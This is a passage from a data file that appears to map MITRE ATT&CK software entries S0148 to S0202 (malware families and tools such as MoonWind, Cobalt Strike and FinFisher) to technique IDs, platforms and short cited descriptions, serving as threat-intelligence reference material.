                          'T1120',
                          'T1115'],
           'description': '[RTM](https://attack.mitre.org/software/S0148) is custom malware written in Delphi. It is '
                          'used by the group of the same name ([RTM](https://attack.mitre.org/groups/G0048)). '
                          '(Citation: ESET RTM Feb 2017)',
           'name': 'RTM',
           'platforms': ['Windows'],
           'software_id': 'S0148',
           'type': 'malware'},
 'S0149': {'attack_ids': ['T1095',
                          'T1124',
                          'T1094',
                          'T1107',
                          'T1016',
                          'T1074',
                          'T1032',
                          'T1056',
                          'T1082',
                          'T1057',
                          'T1043',
                          'T1064',
                          'T1083',
                          'T1033',
                          'T1120',
                          'T1050',
                          'T1059'],
           'description': '[MoonWind](https://attack.mitre.org/software/S0149) is a remote access tool (RAT) that was '
                          'used in 2016 to target organizations in Thailand. (Citation: Palo Alto MoonWind March 2017)',
           'name': 'MoonWind',
           'platforms': ['Windows'],
           'software_id': 'S0149',
           'type': 'malware'},
 'S0150': {'attack_ids': ['T1027', 'T1483', 'T1032', 'T1084', 'T1030', 'T1086', 'T1099', 'T1105'],
           'description': '[POSHSPY](https://attack.mitre.org/software/S0150) is a backdoor that has been used by '
                          '[APT29](https://attack.mitre.org/groups/G0016) since at least 2015. It appears to be used '
                          'as a secondary backdoor used if the actors lost access to their primary backdoors. '
                          '(Citation: FireEye POSHSPY April 2017)',
           'name': 'POSHSPY',
           'platforms': ['Windows'],
           'software_id': 'S0150',
           'type': 'malware'},
 'S0151': {'attack_ids': ['T1047', 'T1107', 'T1082', 'T1113', 'T1057', 'T1086'],
           'description': '[HALFBAKED](https://attack.mitre.org/software/S0151) is a malware family consisting of '
                          'multiple components intended to establish persistence in victim networks. (Citation: '
                          'FireEye FIN7 April 2017)',
           'name': 'HALFBAKED',
           'platforms': ['Windows'],
           'software_id': 'S0151',
           'type': 'malware'},
 'S0152': {'attack_ids': ['T1125', 'T1056', 'T1060', 'T1113', 'T1043', 'T1123'],
           'description': '[EvilGrab](https://attack.mitre.org/software/S0152) is a malware family with common '
                          'reconnaissance capabilities. It has been deployed by '
                          '[menuPass](https://attack.mitre.org/groups/G0045) via malicious Microsoft Office documents '
                          'as part of spearphishing campaigns. (Citation: PWC Cloud Hopper Technical Annex April 2017)',
           'name': 'EvilGrab',
           'platforms': ['Windows'],
           'software_id': 'S0152',
           'type': 'malware'},
 'S0153': {'attack_ids': ['T1094',
                          'T1032',
                          'T1033',
                          'T1059',
                          'T1082',
                          'T1038',
                          'T1065',
                          'T1003',
                          'T1107',
                          'T1016',
                          'T1083',
                          'T1105',
                          'T1071',
                          'T1027',
                          'T1060',
                          'T1113',
                          'T1043',
                          'T1049',
                          'T1023'],
           'description': '[RedLeaves](https://attack.mitre.org/software/S0153) is a malware family used by '
                          '[menuPass](https://attack.mitre.org/groups/G0045). The code overlaps with '
                          '[PlugX](https://attack.mitre.org/software/S0013) and may be based upon the open source tool '
                          'Trochilus. (Citation: PWC Cloud Hopper Technical Annex April 2017) (Citation: FireEye APT10 '
                          'April 2017)',
           'name': 'RedLeaves',
           'platforms': ['Windows'],
           'software_id': 'S0153',
           'type': 'malware'},
 'S0154': {'attack_ids': ['T1075',
                          'T1094',
                          'T1055',
                          'T1175',
                          'T1197',
                          'T1106',
                          'T1029',
                          'T1059',
                          'T1047',
                          'T1026',
                          'T1068',
                          'T1056',
                          'T1090',
                          'T1005',
                          'T1021',
                          'T1086',
                          'T1099',
                          'T1050',
                          'T1028',
                          'T1003',
                          'T1077',
                          'T1018',
                          'T1134',
                          'T1057',
                          'T1093',
                          'T1064',
                          'T1046',
                          'T1088',
                          'T1135',
                          'T1035',
                          'T1066',
                          'T1071',
                          'T1076',
                          'T1502',
                          'T1113',
                          'T1043',
                          'T1185',
                          'T1078'],
           'description': '[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, '
                          'penetration testing tool which bills itself as “adversary simulation software designed to '
                          'execute targeted attacks and emulate the post-exploitation actions of advanced threat '
                          'actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of '
                          'ATT&CK tactics, all executed within a single, integrated system. (Citation: cobaltstrike '
                          'manual)\n'
                          '\n'
                          'In addition to its own capabilities, [Cobalt '
                          'Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other '
                          'well-known tools such as Metasploit and '
                          '[Mimikatz](https://attack.mitre.org/software/S0002). (Citation: cobaltstrike manual)',
           'name': 'Cobalt Strike',
           'platforms': ['Windows'],
           'software_id': 'S0154',
           'type': 'tool'},
 'S0155': {'attack_ids': ['T1095', 'T1094', 'T1107', 'T1082', 'T1012', 'T1033'],
           'description': '[WINDSHIELD](https://attack.mitre.org/software/S0155) is a signature backdoor used by '
                          '[APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)',
           'name': 'WINDSHIELD',
           'platforms': ['Windows'],
           'software_id': 'S0155',
           'type': 'malware'},
 'S0156': {'attack_ids': ['T1047', 'T1082', 'T1059'],
           'description': '[KOMPROGO](https://attack.mitre.org/software/S0156) is a signature backdoor used by '
                          '[APT32](https://attack.mitre.org/groups/G0050) that is capable of process, file, and '
                          'registry management. (Citation: FireEye APT32 May 2017)',
           'name': 'KOMPROGO',
           'platforms': ['Windows'],
           'software_id': 'S0156',
           'type': 'malware'},
 'S0157': {'attack_ids': ['T1071', 'T1010', 'T1112', 'T1082', 'T1083'],
           'description': '[SOUNDBITE](https://attack.mitre.org/software/S0157) is a signature backdoor used by '
                          '[APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)',
           'name': 'SOUNDBITE',
           'platforms': ['Windows'],
           'software_id': 'S0157',
           'type': 'malware'},
 'S0158': {'attack_ids': ['T1095', 'T1094', 'T1112', 'T1059'],
           'description': '[PHOREAL](https://attack.mitre.org/software/S0158) is a signature backdoor used by '
                          '[APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)',
           'name': 'PHOREAL',
           'platforms': ['Windows'],
           'software_id': 'S0158',
           'type': 'malware'},
 'S0159': {'attack_ids': ['T1032', 'T1071', 'T1060', 'T1059'],
           'description': '[SNUGRIDE](https://attack.mitre.org/software/S0159) is a backdoor that has been used by '
                          '[menuPass](https://attack.mitre.org/groups/G0045) as first stage malware. (Citation: '
                          'FireEye APT10 April 2017)',
           'name': 'SNUGRIDE',
           'platforms': ['Windows'],
           'software_id': 'S0159',
           'type': 'malware'},
 'S0160': {'attack_ids': ['T1140', 'T1105', 'T1130'],
           'description': '[certutil](https://attack.mitre.org/software/S0160) is a command-line utility that can be '
                          'used to obtain certificate authority information and configure Certificate Services. '
                          '(Citation: TechNet Certutil)',
           'name': 'certutil',
           'platforms': ['Windows'],
           'software_id': 'S0160',
           'type': 'tool'},
 'S0161': {'attack_ids': ['T1071',
                          'T1107',
                          'T1056',
                          'T1082',
                          'T1503',
                          'T1113',
                          'T1057',
                          'T1106',
                          'T1083',
                          'T1033',
                          'T1120'],
           'description': '[XAgentOSX](https://attack.mitre.org/software/S0161) is a trojan that has been used by '
                          '[APT28](https://attack.mitre.org/groups/G0007)  on OS X and appears to be a port of their '
                          'standard [CHOPSTICK](https://attack.mitre.org/software/S0023) or XAgent trojan. (Citation: '
                          'XAgentOSX 2017)',
           'name': 'XAgentOSX',
           'platforms': ['macOS'],
           'software_id': 'S0161',
           'type': 'malware'},
 'S0162': {'attack_ids': ['T1159', 'T1071', 'T1107', 'T1024', 'T1057', 'T1033', 'T1158'],
           'description': '[Komplex](https://attack.mitre.org/software/S0162) is a backdoor that has been used by '
                          '[APT28](https://attack.mitre.org/groups/G0007) on OS X and appears to be developed in a '
                          'similar manner to [XAgentOSX](https://attack.mitre.org/software/S0161) (Citation: XAgentOSX '
                          '2017) (Citation: Sofacy Komplex Trojan).',
           'name': 'Komplex',
           'platforms': ['macOS'],
           'software_id': 'S0162',
           'type': 'malware'},
 'S0163': {'attack_ids': ['T1168', 'T1116', 'T1113', 'T1123'],
           'description': '[Janicab](https://attack.mitre.org/software/S0163) is an OS X trojan that relied on a valid '
                          'developer ID and oblivious users to install it. (Citation: Janicab)',
           'name': 'Janicab',
           'platforms': ['macOS'],
           'software_id': 'S0163',
           'type': 'malware'},
 'S0164': {'attack_ids': ['T1107', 'T1099', 'T1105', 'T1050', 'T1059'],
           'description': '[TDTESS](https://attack.mitre.org/software/S0164) is a 64-bit .NET binary backdoor used by '
                          '[CopyKittens](https://attack.mitre.org/groups/G0052). (Citation: ClearSky Wilted Tulip July '
                          '2017)',
           'name': 'TDTESS',
           'platforms': ['Windows'],
           'software_id': 'S0164',
           'type': 'malware'},
 'S0165': {'attack_ids': ['T1018', 'T1016', 'T1087', 'T1082', 'T1069', 'T1135', 'T1012', 'T1049'],
           'description': '[OSInfo](https://attack.mitre.org/software/S0165) is a custom tool used by '
                          "[APT3](https://attack.mitre.org/groups/G0022) to do internal discovery on a victim's "
                          'computer and network. (Citation: Symantec Buckeye)',
           'name': 'OSInfo',
           'platforms': ['Windows'],
           'software_id': 'S0165',
           'type': 'malware'},
 'S0166': {'attack_ids': ['T1035', 'T1053', 'T1105'],
           'description': '[RemoteCMD](https://attack.mitre.org/software/S0166) is a custom tool used by '
                          '[APT3](https://attack.mitre.org/groups/G0022) to execute commands on a remote system '
                          "similar to SysInternal's PSEXEC functionality. (Citation: Symantec Buckeye)",
           'name': 'RemoteCMD',
           'platforms': ['Windows'],
           'software_id': 'S0166',
           'type': 'malware'},
 'S0167': {'attack_ids': ['T1071', 'T1003', 'T1027', 'T1055', 'T1085', 'T1056', 'T1053', 'T1060', 'T1113', 'T1059'],
           'description': '[Matroyshka](https://attack.mitre.org/software/S0167) is a malware framework used by '
                          '[CopyKittens](https://attack.mitre.org/groups/G0052) that consists of a dropper, loader, '
                          'and RAT. It has multiple versions; v1 was seen in the wild from July 2016 until January '
                          '2017. v2 has fewer commands and other minor differences. (Citation: ClearSky Wilted Tulip '
                          'July 2017) (Citation: CopyKittens Nov 2015)',
           'name': 'Matroyshka',
           'platforms': ['Windows'],
           'software_id': 'S0167',
           'type': 'malware'},
 'S0168': {'attack_ids': ['T1071',
                          'T1004',
                          'T1107',
                          'T1024',
                          'T1055',
                          'T1027',
                          'T1053',
                          'T1090',
                          'T1096',
                          'T1060',
                          'T1116',
                          'T1180',
                          'T1033',
                          'T1099',
                          'T1105',
                          'T1023'],
           'description': '[Gazer](https://attack.mitre.org/software/S0168) is a backdoor used by '
                          '[Turla](https://attack.mitre.org/groups/G0010) since at least 2016. (Citation: ESET Gazer '
                          'Aug 2017)',
           'name': 'Gazer',
           'platforms': ['Windows'],
           'software_id': 'S0168',
           'type': 'malware'},
 'S0169': {'attack_ids': ['T1074', 'T1005', 'T1036', 'T1022', 'T1050'],
           'description': '[RawPOS](https://attack.mitre.org/software/S0169) is a point-of-sale (POS) malware family '
                          'that searches for cardholder data on victims. It has been in use since at least 2008. '
                          '(Citation: Kroll RawPOS Jan 2017) (Citation: TrendMicro RawPOS April 2015) (Citation: Visa '
                          'RawPOS March 2015) FireEye divides RawPOS into three components: FIENDCRY, DUEBREW, and '
                          'DRIFTWOOD. (Citation: Mandiant FIN5 GrrCON Oct 2016) (Citation: DarkReading FireEye FIN5 '
                          'Oct 2015)',
           'name': 'RawPOS',
           'platforms': ['Windows'],
           'software_id': 'S0169',
           'type': 'malware'},
 'S0170': {'attack_ids': ['T1032',
                          'T1053',
                          'T1030',
                          'T1059',
                          'T1056',
                          'T1132',
                          'T1116',
                          'T1086',
                          'T1119',
                          'T1069',
                          'T1057',
                          'T1064',
                          'T1105',
                          'T1071',
                          'T1074',
                          'T1027',
                          'T1060',
                          'T1115',
                          'T1023'],
           'description': '[Helminth](https://attack.mitre.org/software/S0170) is a backdoor that has at least two '
                          'variants - one written in VBScript and PowerShell that is delivered via a macros in Excel '
                          'spreadsheets, and one that is a standalone Windows executable. (Citation: Palo Alto OilRig '
                          'May 2016)',
           'name': 'Helminth',
           'platforms': ['Windows'],
           'software_id': 'S0170',
           'type': 'malware'},
 'S0171': {'attack_ids': ['T1071', 'T1016', 'T1024', 'T1032', 'T1082', 'T1036', 'T1063', 'T1033', 'T1105', 'T1059'],
           'description': '[Felismus](https://attack.mitre.org/software/S0171) is a modular backdoor that has been '
                          'used by [Sowbug](https://attack.mitre.org/groups/G0054). (Citation: Symantec Sowbug Nov '
                          '2017) (Citation: Forcepoint Felismus Mar 2017)',
           'name': 'Felismus',
           'platforms': ['Windows'],
           'software_id': 'S0171',
           'type': 'malware'},
 'S0172': {'attack_ids': ['T1095',
                          'T1071',
                          'T1094',
                          'T1107',
                          'T1016',
                          'T1027',
                          'T1196',
                          'T1082',
                          'T1060',
                          'T1022',
                          'T1012',
                          'T1033',
                          'T1050',
                          'T1023'],
           'description': '[Reaver](https://attack.mitre.org/software/S0172) is a malware family that has been in the '
                          'wild since at least late 2016. Reporting indicates victims have primarily been associated '
                          'with the "Five Poisons," which are movements the Chinese government considers dangerous. '
                          'The type of malware is rare due to its final payload being in the form of [Control Panel '
                          'Items](https://attack.mitre.org/techniques/T1196). (Citation: Palo Alto Reaver Nov 2017)',
           'name': 'Reaver',
           'platforms': ['Windows'],
           'software_id': 'S0172',
           'type': 'malware'},
 'S0173': {'attack_ids': ['T1071', 'T1090'],
           'description': '[FLIPSIDE](https://attack.mitre.org/software/S0173) is a simple tool similar to Plink that '
                          'is used by [FIN5](https://attack.mitre.org/groups/G0053) to maintain access to victims. '
                          '(Citation: Mandiant FIN5 GrrCON Oct 2016)',
           'name': 'FLIPSIDE',
           'platforms': ['Windows'],
           'software_id': 'S0173',
           'type': 'malware'},
 'S0174': {'attack_ids': ['T1171', 'T1040'],
           'description': 'Responder is an open source tool used for LLMNR, NBT-NS and MDNS poisoning, with built-in '
                          'HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended '
                          'Security NTLMSSP and Basic HTTP authentication. (Citation: GitHub Responder)',
           'name': 'Responder',
           'platforms': ['Windows'],
           'software_id': 'S0174',
           'type': 'tool'},
 'S0175': {'attack_ids': ['T1172'],
           'description': '[meek](https://attack.mitre.org/software/S0175) is an open-source Tor plugin that tunnels '
                          'Tor traffic through HTTPS connections.',
           'name': 'meek',
           'platforms': ['Linux', 'Windows', 'macOS'],
           'software_id': 'S0175',
           'type': 'tool'},
 'S0176': {'attack_ids': ['T1107', 'T1068', 'T1055', 'T1082', 'T1177', 'T1073', 'T1063', 'T1035', 'T1050'],
           'description': '[Wingbird](https://attack.mitre.org/software/S0176) is a backdoor that appears to be a '
                          'version of commercial software [FinFisher](https://attack.mitre.org/software/S0182). It is '
                          'reportedly used to attack individual computers instead of networks. It was used by '
                          '[NEODYMIUM](https://attack.mitre.org/groups/G0055) in a May 2016 campaign. (Citation: '
                          'Microsoft SIR Vol 21) (Citation: Microsoft NEODYMIUM Dec 2016)',
           'name': 'Wingbird',
           'platforms': ['Windows'],
           'software_id': 'S0176',
           'type': 'malware'},
 'S0177': {'attack_ids': ['T1181'],
           'description': '[Power Loader](https://attack.mitre.org/software/S0177) is modular code sold in the '
                          'cybercrime market used as a downloader in malware families such as Carberp, Redyms and '
                          'Gapz. (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and '
                          'Redyms Mar 2013)',
           'name': 'Power Loader',
           'platforms': ['Windows'],
           'software_id': 'S0177',
           'type': 'malware'},
 'S0178': {'attack_ids': ['T1036', 'T1060'],
           'description': '[Truvasys](https://attack.mitre.org/software/S0178) is first-stage malware that has been '
                          'used by [PROMETHIUM](https://attack.mitre.org/groups/G0056). It is a collection of modules '
                          'written in the Delphi programming language. (Citation: Microsoft Win Defender Truvasys Sep '
                          '2017) (Citation: Microsoft NEODYMIUM Dec 2016) (Citation: Microsoft SIR Vol 21)',
           'name': 'Truvasys',
           'platforms': ['Windows'],
           'software_id': 'S0178',
           'type': 'malware'},
 'S0179': {'attack_ids': ['T1003'],
           'description': '[MimiPenguin](https://attack.mitre.org/software/S0179) is a credential dumper, similar to '
                          '[Mimikatz](https://attack.mitre.org/software/S0002), designed specifically for Linux '
                          'platforms. (Citation: MimiPenguin GitHub May 2017)',
           'name': 'MimiPenguin',
           'platforms': ['Linux'],
           'software_id': 'S0179',
           'type': 'tool'},
 'S0180': {'attack_ids': ['T1094',
                          'T1032',
                          'T1007',
                          'T1106',
                          'T1059',
                          'T1140',
                          'T1082',
                          'T1132',
                          'T1036',
                          'T1065',
                          'T1012',
                          'T1050',
                          'T1031',
                          'T1016',
                          'T1107',
                          'T1057',
                          'T1083',
                          'T1105',
                          'T1027',
                          'T1112',
                          'T1043',
                          'T1049'],
           'description': '[Volgmer](https://attack.mitre.org/software/S0180) is a backdoor Trojan designed to provide '
                          'covert access to a compromised system. It has been used since at least 2013 to target the '
                          'government, financial, automotive, and media industries. Its primary delivery mechanism is '
                          'suspected to be spearphishing. (Citation: US-CERT Volgmer Nov 2017)',
           'name': 'Volgmer',
           'platforms': ['Windows'],
           'software_id': 'S0180',
           'type': 'malware'},
 'S0181': {'attack_ids': ['T1016', 'T1024', 'T1107', 'T1082', 'T1083', 'T1099'],
           'description': '[FALLCHILL](https://attack.mitre.org/software/S0181) is a RAT that has been used by '
                          '[Lazarus Group](https://attack.mitre.org/groups/G0032) since at least 2016 to target the '
                          'aerospace, telecommunications, and finance industries. It is usually dropped by other '
                          '[Lazarus Group](https://attack.mitre.org/groups/G0032) malware or delivered when a victim '
                          'unknowingly visits a compromised website. (Citation: US-CERT FALLCHILL Nov 2017)',
           'name': 'FALLCHILL',
           'platforms': ['Windows'],
           'software_id': 'S0181',
           'type': 'malware'},
 'S0182': {'attack_ids': ['T1055',
                          'T1067',
                          'T1140',
                          'T1082',
                          'T1073',
                          'T1038',
                          'T1036',
                          'T1070',
                          'T1012',
                          'T1050',
                          'T1009',
                          'T1134',
                          'T1057',
                          'T1088',
                          'T1083',
                          'T1497',
                          'T1027',
                          'T1113',
                          'T1060',
                          'T1045',
                          'T1179',
                          'T1063',
                          'T1412',
                          'T1433',
                          'T1430',
                          'T1404',
                          'T1436',
                          'T1429'],
           'description': '[FinFisher](https://attack.mitre.org/software/S0182) is a government-grade commercial '
                          'surveillance spyware reportedly sold exclusively to government agencies for use in targeted '
                          'and lawful criminal investigations. It is heavily obfuscated and uses multiple '
                          'anti-analysis techniques. It has other variants including '
                          '[Wingbird](https://attack.mitre.org/software/S0176). (Citation: FinFisher Citation) '
                          '(Citation: Microsoft SIR Vol 21) (Citation: FireEye FinSpy Sept 2017) (Citation: Securelist '
                          'BlackOasis Oct 2017) (Citation: Microsoft FinFisher March 2018)',
           'name': 'FinFisher',
           'platforms': ['Windows', 'Android'],
           'software_id': 'S0182',
           'type': 'malware'},
 'S0183': {'attack_ids': ['T1188', 'T1079'],
           'description': '[Tor](https://attack.mitre.org/software/S0183) is a software suite and network that '
                          'provides increased anonymity on the Internet. It creates a multi-hop proxy network and '
                          'utilizes multilayer encryption to protect both the message and routing information. '
                          '[Tor](https://attack.mitre.org/software/S0183) utilizes "Onion Routing," in which messages '
                          'are encrypted with multiple layers of encryption; at each step in the proxy network, the '
                          'topmost layer is decrypted and the contents forwarded on to the next node until it reaches '
                          'its destination. (Citation: Dingledine Tor The Second-Generation Onion Router)',
           'name': 'Tor',
           'platforms': ['Linux', 'Windows', 'macOS'],
           'software_id': 'S0183',
           'type': 'tool'},
 'S0184': {'attack_ids': ['T1047',
                          'T1071',
                          'T1016',
                          'T1087',
                          'T1053',
                          'T1082',
                          'T1132',
                          'T1069',
                          'T1113',
                          'T1057',
                          'T1086',
                          'T1083',
                          'T1063',
                          'T1012',
                          'T1049',
                          'T1033',
                          'T1105',
                          'T1059'],
           'description': '[POWRUNER](https://attack.mitre.org/software/S0184) is a PowerShell script that sends and '
                          'receives commands to and from the C2 server. (Citation: FireEye APT34 Dec 2017)',
           'name': 'POWRUNER',
           'platforms': ['Windows'],
           'software_id': 'S0184',
           'type': 'malware'},
 'S0185': {'attack_ids': ['T1100', 'T1099', 'T1105', 'T1059'],
           'description': '[SEASHARPEE](https://attack.mitre.org/software/S0185) is a Web shell that has been used by '
                          '[APT34](https://attack.mitre.org/groups/G0057). (Citation: FireEye APT34 Webinar Dec 2017)',
           'name': 'SEASHARPEE',
           'platforms': ['Windows'],
           'software_id': 'S0185',
           'type': 'malware'},
 'S0186': {'attack_ids': ['T1071', 'T1082', 'T1060', 'T1086', 'T1012', 'T1033', 'T1059'],
           'description': '[DownPaper](https://attack.mitre.org/software/S0186) is a backdoor Trojan; its main '
                          'functionality is to download and run second stage malware. (Citation: ClearSky Charming '
                          'Kitten Dec 2017)',
           'name': 'DownPaper',
           'platforms': ['Windows'],
           'software_id': 'S0186',
           'type': 'malware'},
 'S0187': {'attack_ids': ['T1071',
                          'T1003',
                          'T1027',
                          'T1032',
                          'T1056',
                          'T1132',
                          'T1113',
                          'T1036',
                          'T1045',
                          'T1001',
                          'T1022',
                          'T1116',
                          'T1002',
                          'T1105',
                          'T1066',
                          'T1059'],
           'description': '[Daserf](https://attack.mitre.org/software/S0187) is a backdoor that has been used to spy '
                          'on and steal from Japanese, South Korean, Russian, Singaporean, and Chinese victims. '
                          'Researchers have identified versions written in both Visual C and Delphi. (Citation: Trend '
                          'Micro Daserf Nov 2017) (Citation: Secureworks BRONZE BUTLER Oct 2017)',
           'name': 'Daserf',
           'platforms': ['Windows'],
           'software_id': 'S0187',
           'type': 'malware'},
 'S0188': {'attack_ids': ['T1036', 'T1140'],
           'description': '[Starloader](https://attack.mitre.org/software/S0188) is a loader component that has been '
                          'observed loading [Felismus](https://attack.mitre.org/software/S0171) and associated tools. '
                          '(Citation: Symantec Sowbug Nov 2017)',
           'name': 'Starloader',
           'platforms': ['Windows'],
           'software_id': 'S0188',
           'type': 'malware'},
 'S0189': {'attack_ids': ['T1140', 'T1053', 'T1027', 'T1093'],
           'description': '[ISMInjector](https://attack.mitre.org/software/S0189) is a Trojan used to install another '
                          '[OilRig](https://attack.mitre.org/groups/G0049) backdoor, ISMAgent. (Citation: OilRig New '
                          'Delivery Oct 2017)',
           'name': 'ISMInjector',
           'platforms': ['Windows'],
           'software_id': 'S0189',
           'type': 'malware'},
 'S0190': {'attack_ids': ['T1048', 'T1105', 'T1197'],
           'description': '[BITSAdmin](https://attack.mitre.org/software/S0190) is a command line tool used to create '
                          'and manage [BITS Jobs](https://attack.mitre.org/techniques/T1197). (Citation: Microsoft '
                          'BITSAdmin)',
           'name': 'BITSAdmin',
           'platforms': ['Windows'],
           'software_id': 'S0190',
           'type': 'tool'},
 'S0191': {'attack_ids': ['T1035'],
           'description': '[Winexe](https://attack.mitre.org/software/S0191) is a lightweight, open source tool '
                          'similar to [PsExec](https://attack.mitre.org/software/S0029) designed to allow system '
                          'administrators to execute commands on remote servers. (Citation: Winexe Github Sept 2013) '
                          '[Winexe](https://attack.mitre.org/software/S0191) is unique in that it is a GNU/Linux based '
                          'client. (Citation: Überwachung APT28 Forfiles June 2015)',
           'name': 'Winexe',
           'platforms': ['Windows'],
           'software_id': 'S0191',
           'type': 'tool'},
 'S0192': {'attack_ids': ['T1055',
                          'T1087',
                          'T1032',
                          'T1079',
                          'T1002',
                          'T1056',
                          'T1082',
                          'T1171',
                          'T1070',
                          'T1086',
                          'T1134',
                          'T1125',
                          'T1003',
                          'T1016',
                          'T1057',
                          'T1114',
                          'T1064',
                          'T1046',
                          'T1135',
                          'T1088',
                          'T1123',
                          'T1083',
                          'T1035',
                          'T1497',
                          'T1105',
                          'T1071',
                          'T1501',
                          'T1136',
                          'T1076',
                          'T1060',
                          'T1113',
                          'T1041',
                          'T1049',
                          'T1033'],
           'description': '[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, '
                          'Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub '
                          'Pupy) It is written in Python and can be generated as a payload in several different ways '
                          '(Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). '
                          '(Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly '
                          'available on GitHub. (Citation: GitHub Pupy)',
           'name': 'Pupy',
           'platforms': ['Linux', 'Windows', 'macOS', 'Android'],
           'software_id': 'S0192',
           'type': 'tool'},
 'S0193': {'attack_ids': ['T1083', 'T1005', 'T1202'],
           'description': '[Forfiles](https://attack.mitre.org/software/S0193) is a Windows utility commonly used in '
                          'batch jobs to execute commands on one or more selected files or directories (ex: list all '
                          'directories in a drive, read the first line of all files created yesterday, etc.). Forfiles '
                          'can be executed from either the command line, Run window, or batch files/scripts. '
                          '(Citation: Microsoft Forfiles Aug 2016)',
           'name': 'Forfiles',
           'platforms': ['Windows'],
           'software_id': 'S0193',
           'type': 'tool'},
 'S0194': {'attack_ids': ['T1055',
                          'T1087',
                          'T1053',
                          'T1482',
                          'T1034',
                          'T1101',
                          'T1047',
                          'T1056',
                          'T1038',
                          'T1005',
                          'T1086',
                          'T1012',
                          'T1031',
                          'T1003',
                          'T1134',
                          'T1057',
                          'T1123',
                          'T1066',
                          'T1027',
                          'T1060',
                          'T1113',
                          'T1208',
                          'T1214'],
           'description': '[PowerSploit](https://attack.mitre.org/software/S0194) is an open source, offensive '
                          'security framework comprised of [PowerShell](https://attack.mitre.org/techniques/T1086) '
                          'modules and scripts that perform a wide range of tasks related to penetration testing such '
                          'as code execution, persistence, bypassing anti-virus, recon, and exfiltration. (Citation: '
                          'GitHub PowerSploit May 2012) (Citation: PowerShellMagazine PowerSploit July 2014) '
                          '(Citation: PowerSploit Documentation)',
           'name': 'PowerSploit',
           'platforms': ['Windows'],
           'software_id': 'S0194',
           'type': 'tool'},
 'S0195': {'attack_ids': ['T1485', 'T1107', 'T1116'],
           'description': '[SDelete](https://attack.mitre.org/software/S0195) is an application that securely deletes '
                          'data in a way that makes it unrecoverable. It is part of the Microsoft Sysinternals suite '
                          'of tools. (Citation: Microsoft SDelete July 2016)',
           'name': 'SDelete',
           'platforms': ['Windows'],
           'software_id': 'S0195',
           'type': 'tool'},
 'S0196': {'attack_ids': ['T1140',
                          'T1071',
                          'T1107',
                          'T1087',
                          'T1074',
                          'T1027',
                          'T1085',
                          'T1082',
                          'T1063',
                          'T1069',
                          'T1129',
                          'T1060',
                          'T1036',
                          'T1064',
                          'T1182',
                          'T1002',
                          'T1105'],
           'description': '[PUNCHBUGGY](https://attack.mitre.org/software/S0196) is a backdoor malware used by '
                          '[FIN8](https://attack.mitre.org/groups/G0061) that has been observed targeting POS networks '
                          'in the hospitality industry. (Citation: Morphisec ShellTea June 2019)(Citation: FireEye '
                          'Fin8 May 2016) (Citation: FireEye Know Your Enemy FIN8 Aug 2016)',
           'name': 'PUNCHBUGGY',
           'platforms': ['Windows'],
           'software_id': 'S0196',
           'type': 'malware'},
 'S0197': {'attack_ids': ['T1074', 'T1027', 'T1005'],
           'description': '[PUNCHTRACK](https://attack.mitre.org/software/S0197) is non-persistent point of sale (POS) '
                          'system malware utilized by [FIN8](https://attack.mitre.org/groups/G0061) to scrape payment '
                          'card data. (Citation: FireEye Fin8 May 2016) (Citation: FireEye Know Your Enemy FIN8 Aug '
                          '2016)',
           'name': 'PUNCHTRACK',
           'platforms': ['Windows'],
           'software_id': 'S0197',
           'type': 'malware'},
 'S0198': {'attack_ids': ['T1056', 'T1082', 'T1113', 'T1060', 'T1116'],
           'description': '[NETWIRE](https://attack.mitre.org/software/S0198) is a publicly available, multiplatform '
                          'remote administration tool (RAT) that has been used by criminal and APT groups since at '
                          'least 2012. (Citation: FireEye APT33 Sept 2017) (Citation: McAfee Netwire Mar 2015) '
                          '(Citation: FireEye APT33 Webinar Sept 2017)',
           'name': 'NETWIRE',
           'platforms': ['Windows'],
           'software_id': 'S0198',
           'type': 'malware'},
 'S0199': {'attack_ids': ['T1055', 'T1082', 'T1113', 'T1060', 'T1105', 'T1059'],
           'description': '[TURNEDUP](https://attack.mitre.org/software/S0199) is a non-public backdoor. It has been '
                          "dropped by [APT33](https://attack.mitre.org/groups/G0064)'s "
                          '[StoneDrill](https://attack.mitre.org/software/S0380) malware. (Citation: FireEye APT33 '
                          'Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)',
           'name': 'TURNEDUP',
           'platforms': ['Windows'],
           'software_id': 'S0199',
           'type': 'malware'},
 'S0200': {'attack_ids': ['T1071', 'T1004', 'T1094', 'T1032', 'T1132', 'T1029', 'T1105', 'T1059'],
           'description': '[Dipsind](https://attack.mitre.org/software/S0200) is a malware family of backdoors that '
                          'appear to be used exclusively by [PLATINUM](https://attack.mitre.org/groups/G0068). '
                          '(Citation: Microsoft PLATINUM April 2016)',
           'name': 'Dipsind',
           'platforms': ['Windows'],
           'software_id': 'S0200',
           'type': 'malware'},
 'S0201': {'attack_ids': ['T1055',
                          'T1197',
                          'T1007',
                          'T1059',
                          'T1222',
                          'T1056',
                          'T1082',
                          'T1012',
                          'T1107',
                          'T1016',
                          'T1069',
                          'T1057',
                          'T1083',
                          'T1105',
                          'T1071',
                          'T1027',
                          'T1089',
                          'T1063',
                          'T1033'],
           'description': '[JPIN](https://attack.mitre.org/software/S0201) is a custom-built backdoor family used by '
                          '[PLATINUM](https://attack.mitre.org/groups/G0068). Evidence suggests developers of '
                          '[JPIN](https://attack.mitre.org/software/S0201) and '
                          '[Dipsind](https://attack.mitre.org/software/S0200) code bases were related in some way. '
                          '(Citation: Microsoft PLATINUM April 2016)',
           'name': 'JPIN',
           'platforms': ['Windows'],
           'software_id': 'S0201',
           'type': 'malware'},
 'S0202': {'attack_ids': ['T1032', 'T1084', 'T1059'],
           'description': '[adbupd](https://attack.mitre.org/software/S0202) is a backdoor used by '
                          '[PLATINUM](https://attack.mitre.org/groups/G0068) that is similar to '
